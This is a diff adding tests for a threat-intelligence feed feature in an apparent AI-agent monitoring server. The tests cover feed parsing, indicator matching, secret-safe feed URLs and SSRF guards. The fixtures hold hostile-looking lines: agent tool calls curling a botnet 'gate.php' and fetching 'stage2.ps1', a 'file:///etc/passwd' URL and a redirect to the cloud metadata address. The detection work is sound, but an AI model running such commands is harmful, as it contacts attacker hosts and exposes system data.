@@ -4730,6 +4730,299 @@ check("the icons are real PNGs, drawn by a script that compiles",
 check("the server image leaves the desktop app out",
       "\ndesktop\n" in _P(".dockerignore").read_text(encoding="utf-8"))
 
+print("\n== threat intelligence feeds (v0.39) ==")
+import http.server as _hs39
+import socketserver as _ss39
+import threading as _th39
+from datetime import datetime as _dt39, timedelta as _td39
+import intel as _in
+
+# -- reading feeds ------------------------------------------------------------------
+check("a text feed: comments skipped, the first token of each line taken",
+      _in.parse(b"# Feodo Tracker\n198.51.100.7\n; note\n\n203.0.113.9 ; SBL123\n", "text", None)
+      == ["198.51.100.7", "203.0.113.9"])
+_csv39 = (b'# id,dateadded,url,url_status\n"1","2026-11-01","http://bad.example/x.exe","online"\n'
+          b'"2","2026-11-02","https://evil.example/a?b=1","online"\n')
+check("a CSV feed by column number, with its header commented out (abuse.ch style)",
+      _in.parse(_csv39, "csv", "2") == ["http://bad.example/x.exe", "https://evil.example/a?b=1"])
+check("a CSV feed by column name",
+      _in.parse(b"ip,first_seen\n198.51.100.7,2026\n", "csv", "ip") == ["198.51.100.7"])
+check("JSON: an array of objects, or one object per line (Spamhaus style)",
+      _in.parse(b'[{"ip_address":"198.51.100.7"},{"ip_address":"203.0.113.9"}]', "json", "ip_address")
+      == ["198.51.100.7", "203.0.113.9"]
+      and _in.parse(b'{"cidr":"198.51.100.0/24","sblid":"SBL1"}\n{"cidr":"203.0.113.0/24"}\n', "json", "cidr")
+      == ["198.51.100.0/24", "203.0.113.0/24"])
+_errs39 = []
+for _body, _fmt, _fld in [(b'[{"a":"x"}]', "json", "ip"), (b"a,b\n1,2\n", "csv", "url"), (b"x", "yaml", None)]:
+    try:
+        _in.parse(_body, _fmt, _fld)
+    except _in.IntelError as _e:
+        _errs39.append(str(_e))
+check("a wrong field, column or format is refused with a reason", len(_errs39) == 3
+      and "no column called 'url'" in _errs39[1])
+
+check("entries are understood as IP addresses, networks, domains and URLs",
+      _in.classify("198.51.100.7") == ("ip", "198.51.100.7")
+      and _in.classify("198.51.100.0/24") == ("cidr", "198.51.100.0/24")
+      and _in.classify("*.Evil.Example.") == ("domain", "evil.example")
+      and _in.classify("HTTPS://Evil.Example/Payload.EXE#frag") == ("url", "https://evil.example/Payload.EXE"))
+check("entries that would match your own network or half the internet are dropped",
+      all(_in.classify(v) is None for v in ["10.0.0.5", "192.168.1.0/24", "127.0.0.1", "localhost",
+                                            "0.0.0.0/0", "64.0.0.0/2", "2001::/16", "::1",
+                                            "http://10.0.0.1/x", "not an indicator", "report",
+                                            "fe80::1"]))
+_now39 = _dt39(2026, 11, 8, 12, 0, 0)
+_L = lambda kind, value, retired=None, first="2026-11-08T12:00:00": _in.Listing(
+    1, "Test feed", "high", ("T1071",), kind, value, first, retired)
+_ix39 = _in.Index([_L("ip", "198.51.100.7"), _L("cidr", "203.0.113.0/24"), _L("domain", "evil.example"),
+                   _L("url", "https://cdn.example/payload.exe"), _L("cidr", "2001:db8:dead::/48"),
+                   _L("domain", "gone.example", retired="2026-11-08T13:00:00")])
+_m = lambda obs, at=_now39: sorted(m.listing.value for m in _ix39.match(obs, at))
+check("an address, an address inside a listed network, and IPv6 networks match",
+      _m(["198.51.100.7"]) == ["198.51.100.7"] and _m(["203.0.113.200"]) == ["203.0.113.0/24"]
+      and _m(["2001:db8:dead:1::5"]) == ["2001:db8:dead::/48"] and _m(["198.51.100.8"]) == [])
+check("a listed domain matches itself and anything under it, but not its parent",
+      _m(["evil.example"]) == ["evil.example"] and _m(["a.b.evil.example"]) == ["evil.example"]
+      and _m(["example"]) == [] and _m(["notevil.example"]) == [])
+check("a listed URL matches that URL, and doesn't make its whole (shared) host bad",
+      _m(["https://CDN.example/payload.exe"]) == ["https://cdn.example/payload.exe"]
+      and _m(["https://cdn.example/other.js", "cdn.example"]) == [])
+check("an entry the feed dropped still matches what happened while it was listed, not after",
+      _m(["gone.example"], _dt39(2026, 11, 8, 12, 30)) == ["gone.example"]
+      and _m(["gone.example"], _dt39(2026, 11, 8, 14, 0)) == [])
+
+# -- fetching, fenced ---------------------------------------------------------------
+check("a key comes from the server's environment, only from SHADOWFAX_INTEL_ variables",
+      _in.resolve_url("https://x.example/{env:SHADOWFAX_INTEL_K}/f.csv", {"SHADOWFAX_INTEL_K": "s3cr3t"})
+      == "https://x.example/s3cr3t/f.csv")
+_bad39 = []
+for _tpl in ["https://x.example/{env:SHADOWFAX_DATABASE_PASSWORD}", "http://x.example/feed.txt",
+             "file:///etc/passwd", "https://user:pw@x.example/f", "https://x.example/{env:PATH}"]:
+    try:
+        _in.check_template(_tpl)
+    except _in.IntelError as _e:
+        _bad39.append(str(_e))
+check("feed URLs that are plain http, carry a password, or reach for other variables are refused",
+      len(_bad39) == 5 and "SHADOWFAX_INTEL_something" in _bad39[0])
+try:
+    _in.resolve_url("https://x.example/{env:SHADOWFAX_INTEL_MISSING}", {})
+    _miss39 = ""
+except _in.IntelError as _e:
+    _miss39 = str(_e)
+check("a missing key says which variable to set", "SHADOWFAX_INTEL_MISSING" in _miss39)
+try:
+    _in.resolve_url("https://x.example/{env:SHADOWFAX_DATABASE_PASSWORD}",
+                    {"SHADOWFAX_DATABASE_PASSWORD": "the-real-db-password"})
+    _leak39 = "filled in"
+except _in.IntelError as _e:
+    _leak39 = str(_e)
+check("and the download checks the variable's name again, whatever is stored",
+      "SHADOWFAX_INTEL_something" in _leak39)
+_ssrf39 = []
+for _u in ["https://127.0.0.1:9/feed", "https://localhost:9/feed", "http://198.51.100.7/feed"]:
+    try:
+        _in.fetch(_u, allow_private=False, timeout=2)
+        _ssrf39.append("fetched")
+    except _in.IntelError as _e:
+        _ssrf39.append(str(_e))
+check("the server won't fetch a feed from inside its own network, or over plain http",
+      "not a public address" in _ssrf39[0] and "not a public address" in _ssrf39[1]
+      and "https" in _ssrf39[2])
+
+
+class _Feed39(_hs39.BaseHTTPRequestHandler):
+    routes = {}
+
+    def do_GET(self):
+        code, body, headers = self.routes.get(self.path, (404, b"", {}))
+        self.send_response(code)
+        for k, v in headers.items():
+            self.send_header(k, v)
+        self.end_headers()
+        self.wfile.write(body)
+
+    def log_message(self, *a):
+        pass
+
+
+_srv39 = _ss39.TCPServer(("127.0.0.1", 0), _Feed39)
+_th39.Thread(target=_srv39.serve_forever, daemon=True).start()
+_base39 = f"http://127.0.0.1:{_srv39.server_address[1]}"
+_Feed39.routes = {"/ok.txt": (200, b"198.51.100.7\n", {}), "/gone": (410, b"", {}),
+                  "/moved": (302, b"", {"Location": "http://169.254.169.254/latest"}),
+                  "/big": (200, b"x" * 5000, {})}
+_got39 = _in.fetch(_base39 + "/ok.txt", allow_private=True, timeout=5)
+_old_max39 = _in.MAX_DOWNLOAD_BYTES
+_in.MAX_DOWNLOAD_BYTES = 1000
+_fails39 = []
+for _p in ["/gone", "/moved", "/big"]:
+    try:
+        _in.fetch(_base39 + _p, allow_private=True, timeout=5)
+        _fails39.append("fetched")
+    except _in.IntelError as _e:
+        _fails39.append(str(_e))
+_in.MAX_DOWNLOAD_BYTES = _old_max39
+check("a real download works (in a lab that allows its own network)", _got39 == b"198.51.100.7\n")
+check("a 410 says the feed may now need a key; redirects aren't followed; size is capped",
+      "account key" in _fails39[0] and "redirect" in _fails39[1] and "MB" in _fails39[2])
+
+# -- the API -------------------------------------------------------------------------
+client.post("/users", json={"username": "intel-analyst", "password": TEST_PW, "role": "analyst"})
+client.post("/users", json={"username": "intel-viewer", "password": TEST_PW, "role": "viewer"})
+_an39 = as_user("intel-analyst", TEST_PW)
+_vw39 = as_user("intel-viewer", TEST_PW)
+_pre39 = {p["key"] for p in _vw39.get("/intel/presets").json()}
+check("presets for well-known free feeds; anyone signed in can see the feeds",
+      {"feodo", "spamhaus-drop", "urlhaus"} <= _pre39 and _vw39.get("/intel/feeds").status_code == 200)
+check("only an admin can add a feed",
+      _an39.post("/intel/feeds", json={"preset": "feodo"}).status_code == 403)
+_r39 = client.post("/intel/feeds", json={"preset": "feodo"})
+_feodo39 = _r39.json()
+check("an admin adds Feodo Tracker from its preset",
+      _r39.status_code == 200 and _feodo39["kind"] == "remote" and _feodo39["severity"] == "critical"
+      and _feodo39["url"].startswith("https://feodotracker.abuse.ch/"))
+check("the same feed can't be added twice",
+      client.post("/intel/feeds", json={"preset": "feodo"}).status_code == 409)
+check("a feed URL that could leak a server secret or isn't https is refused at the door",
+      client.post("/intel/feeds", json={"name": "x", "url": "https://a.example/{env:SHADOWFAX_DATABASE_PASSWORD}"}).status_code == 400
+      and client.post("/intel/feeds", json={"name": "y", "url": "http://a.example/f.txt"}).status_code == 400
+      and client.post("/intel/feeds", json={"name": "z", "url": "https://a.example/f.json", "format": "json"}).status_code == 400)
+
+app_module._intel_fetcher = lambda url: b"# Feodo\n198.51.100.7\n203.0.113.66\n10.9.9.9\n"
+_ref39 = client.post(f"/intel/feeds/{_feodo39['id']}/refresh").json()
+check("refreshing reads the download: two botnet servers listed, the internal address dropped",
+      _ref39["ok"] and _ref39["added"] == 2 and _ref39["dropped"] == 1
+      and client.get("/intel/feeds").json()["feeds"][0]["listed"] == 2)
+_t0_39 = _dt39.utcnow()
+# Milliseconds after the refresh: real events happen between one refresh and
+# the next, and the retirement test below depends on exactly that.
+_iso39 = lambda delta_ms: (_t0_39 + _td39(milliseconds=delta_ms)).isoformat()
+
+
+def _ev39(actor, minutes, target, **meta):
+    return {"timestamp": _iso39(minutes), "actor_id": actor, "actor_type": "ai_agent",
+            "event_type": "tool_call", "target": target, "metadata": meta}
+
+
+client.post("/events", json=[
+    _ev39("intel-agent-1", 5, "curl -s http://198.51.100.7:8080/gate.php", tool="Bash",
+          command="curl -s http://198.51.100.7:8080/gate.php"),
+    _ev39("intel-agent-1", 6, "https://docs.python.org/3/", tool="WebFetch", url="https://docs.python.org/3/"),
+])
+_ti39 = [a for a in _alerts37("intel-agent-1") if a["category"] == "threat_intel_match"]
+check("an agent calling a listed botnet server raises threat_intel_match, at the feed's severity",
+      len(_ti39) == 1 and _ti39[0]["severity"] == "critical"
+      and "Feodo Tracker" in _ti39[0]["message"] and "198.51.100.7" in _ti39[0]["message"]
+      and [t["id"] for t in _ti39[0]["attack"]] == ["T1071"])
+_id39 = _ti39[0]["id"]
+client.post("/events", json=[{**_ev39("intel-agent-1", 7, "update"), "event_type": "tool_result",
+                              "metadata": {"tool": "WebFetch", "output": "mirror at http://198.51.100.7/"}}])
+check("an address only mentioned in what the agent read isn't a match: reading isn't reaching",
+      len([a for a in _alerts37("intel-agent-1") if a["category"] == "threat_intel_match"]) == 1)
+client.post("/events", json=[{"timestamp": _iso39(8), "actor_id": "intel-user-1", "actor_type": "human",
+                              "event_type": "login", "target": "vpn",
+                              "metadata": {"source_ip": "203.0.113.66"}}])
+check("a sign-in from a listed address is a match too",
+      any(a["category"] == "threat_intel_match" and "203.0.113.66" in a["message"]
+          for a in _alerts37("intel-user-1")))
+
+# Going back over what already happened, when a feed learns something new.
+client.post("/events", json=[_ev39("intel-agent-2", -1440, "https://drop.badcdn.example/stage2.ps1",
+                                   tool="WebFetch", url="https://drop.badcdn.example/stage2.ps1")])
+check("nothing to match yet", not [a for a in _alerts37("intel-agent-2") if a["category"] == "threat_intel_match"])
+_wl39 = client.post("/intel/feeds", json={"watchlist": True, "name": "Our watchlist", "severity": "high"}).json()
+_put39 = client.put(f"/intel/feeds/{_wl39['id']}/entries",
+                    json={"values": ["badcdn.example", "10.0.0.1", "not a thing", "  "]}).json()
+_retro39 = [a for a in _alerts37("intel-agent-2") if a["category"] == "threat_intel_match"]
+check("a watchlist takes the team's own entries, saying which it couldn't use",
+      _put39["added"] == 1 and _put39["rejected"] == ["10.0.0.1", "not a thing"])
+check("adding an entry finds yesterday's visit, and says it happened before the listing",
+      len(_retro39) == 1 and "listed only later" in _retro39[0]["message"]
+      and "badcdn.example" in _retro39[0]["message"])
+check("a feed's entries can't be hand-edited, and only an admin edits a watchlist",
+      client.put(f"/intel/feeds/{_feodo39['id']}/entries", json={"values": ["1.2.3.4"]}).status_code == 400
+      and _an39.put(f"/intel/feeds/{_wl39['id']}/entries", json={"values": []}).status_code == 403
+      and _an39.get(f"/intel/feeds/{_wl39['id']}/entries").json()[0]["value"] == "badcdn.example")
+
+# A feed dropping an entry keeps the alerts from when it was listed.
+app_module._intel_fetcher = lambda url: b"203.0.113.66\n"
+_ref39b = client.post(f"/intel/feeds/{_feodo39['id']}/refresh").json()
+check("a refresh retires what the feed no longer lists, and keeps it", _ref39b["retired"] == 1
+      and client.get("/intel/feeds").json()["feeds"][0]["retired"] == 1)
+check("the alert from while it was listed is still there, with the same id",
+      any(a["id"] == _id39 for a in _alerts37("intel-agent-1")))
+client.post("/events", json=[{**_ev39("intel-agent-1", 0, "curl http://198.51.100.7/", tool="Bash",
+                                       command="curl http://198.51.100.7/"),
+                               "timestamp": (_dt39.utcnow() + _td39(hours=1)).isoformat()}])
+check("but reaching it after it was dropped isn't flagged",
+      len([a for a in _alerts37("intel-agent-1") if a["category"] == "threat_intel_match"]) == 1)
+
+# Admin changes, and the trail they leave.
+client.patch(f"/intel/feeds/{_feodo39['id']}", json={"enabled": False})
+check("switching a feed off removes its matches", not any(a["id"] == _id39 for a in _alerts37("intel-agent-1")))
+client.patch(f"/intel/feeds/{_feodo39['id']}", json={"enabled": True, "severity": "high"})
+_back39 = [a for a in _alerts37("intel-agent-1") if a["id"] == _id39]
+check("switching it back restores them, at the feed's new severity",
+      len(_back39) == 1 and _back39[0]["severity"] == "high")
+_trail39 = [e for e in client.get("/events", params={"actor_id": "shadowfax-intel"}).json()]
+check("every change to a feed is in the ledger, with who made it",
+      [e["metadata"]["action"] for e in _trail39]
+      == ["added", "added", "entries_changed", "changed", "changed"]
+      and all(e["metadata"]["by"] == "admin" for e in _trail39)
+      and any(e["metadata"]["action"] == "changed" and e["metadata"]["changes"].get("enabled") == [True, False]
+              for e in _trail39))
+check("feed changes never raise alerts of their own, however many there are",
+      not _alerts37("shadowfax-intel"))
+check("nobody else can write as the intel actor, or post feed changes as events",
+      client.post("/events", json=[{"timestamp": _iso39(1), "actor_id": "shadowfax-intel",
+                                    "actor_type": "service_account", "event_type": "x",
+                                    "target": "y"}]).status_code == 400
+      and client.post("/events", json=[{"timestamp": _iso39(1), "actor_id": "someone",
+                                        "actor_type": "human", "event_type": "intel_feed_change",
+                                        "target": "y"}]).status_code == 400)
+
+_lk39 = _an39.get("/intel/lookup", params={"value": "https://a.b.badcdn.example/x"}).json()
+check("lookup: is this on any feed? (a URL on a subdomain of a listed domain is)",
+      _lk39["listed"] and _lk39["listed"][0]["value"] == "badcdn.example"
+      and _an39.get("/intel/lookup", params={"value": "python.org"}).json()["listed"] == []
+      and _vw39.get("/intel/lookup", params={"value": "x.example"}).status_code == 403)
+
+# A failed refresh changes nothing but the status.
+def _fail39(url):
+    raise _in.IntelError("the feed refused the download (410). It may now need an account key")
+app_module._intel_fetcher = _fail39
+_ref39c = client.post(f"/intel/feeds/{_feodo39['id']}/refresh").json()
+_f39 = next(f for f in client.get("/intel/feeds").json()["feeds"] if f["id"] == _feodo39["id"])
+check("a failed refresh keeps the indicators and shows why it failed",
+      _ref39c["ok"] is False and "410" in _f39["last_error"] and _f39["listed"] == 1)
+
+os.environ["SHADOWFAX_INTEL_TEST_KEY"] = "sk-very-secret-123"
+_kf39 = client.post("/intel/feeds", json={"name": "Keyed feed", "format": "csv", "field": "2",
+                                          "url": "https://feeds.example/{env:SHADOWFAX_INTEL_TEST_KEY}/recent.csv"}).json()
+_seen_urls39 = []
+app_module._intel_fetcher = lambda url: (_seen_urls39.append(url), b"x,y,https://ransom.example/p\n")[1]
+client.post(f"/intel/feeds/{_kf39['id']}/refresh")
+_dump39 = json.dumps(client.get("/intel/feeds").json()) + json.dumps(
+    client.get("/events", params={"actor_id": "shadowfax-intel"}).json())
+check("a key reaches the download, and is never stored or shown",
+      _seen_urls39 == ["https://feeds.example/sk-very-secret-123/recent.csv"]
+      and "sk-very-secret-123" not in _dump39 and "{env:SHADOWFAX_INTEL_TEST_KEY}" in _dump39)
+del os.environ["SHADOWFAX_INTEL_TEST_KEY"]
+
+_due39 = app_module._intel_due(_dt39.utcnow() + _td39(hours=7))
+check("the background refresher picks feeds whose time is up, never watchlists",
+      _feodo39["id"] in _due39 and _wl39["id"] not in _due39
+      and app_module._intel_due(_dt39.utcnow() - _td39(hours=1)) == [])
+
+_del39 = client.delete(f"/intel/feeds/{_wl39['id']}")
+check("removing a watchlist removes its matches",
+      _del39.status_code == 200
+      and not [a for a in _alerts37("intel-agent-2") if a["category"] == "threat_intel_match"])
+check("a new detector category, thirty-three in all",
+      "threat_intel_match" in _detectors.NATIVE_CATEGORIES and len(_detectors.NATIVE_CATEGORIES) == 33)
+app_module._intel_fetcher = None
+_srv39.shutdown()
+
 print("\n== same-second events keep their order (v0.34.1) ==")
 # Timestamps go down to the second. On PostgreSQL, rows that share one came back
 # in whatever order they sat on disk, and an UPDATE moves a row to the end -- CI
